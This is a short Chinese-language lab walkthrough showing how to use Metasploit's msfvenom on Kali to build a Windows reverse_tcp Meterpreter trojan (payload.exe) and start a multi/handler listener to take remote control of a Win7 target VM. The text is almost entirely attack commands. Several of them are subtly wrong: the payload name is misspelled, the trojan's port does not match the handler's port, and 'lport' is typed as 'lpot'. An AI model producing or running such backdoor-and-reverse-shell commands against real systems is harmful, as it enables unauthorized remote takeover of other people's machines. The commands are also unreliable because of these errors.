本期使用工具：Metasploit  虚拟机：kali（2021.2版本）攻击机一台  win7靶机一台

本期目标：在kali虚拟机中使用metasploit生成木马文件，植入win7虚拟机后远程控制靶机

在kali命令行下输入：msfconsole启动Metasploit

 

我们可以输入msfvenom -l payloads查看所以的payload。

本次我们使用的是payload是：windows/metepreter/reverse_tcp,它有两个需要设置的参数：LHOST:主控端IP，也就是我们kali的IP

 LPORT:使用的端口

我们在命令行输入：msfvenom -p windows/metepreter/reverse_tcp  lhost=192.168.198.138  lport=8888 -f exe -o /home/kali/Desktop/payload.exe

这样metasploit就生成了一个木马文件！

  

我们在kali命令行依次输入：

Use exploit/multi/handler

Set payload windows/meterpreter/reverse_tcp

Set lhost 192.168.198.138

Set lpot 5555

run
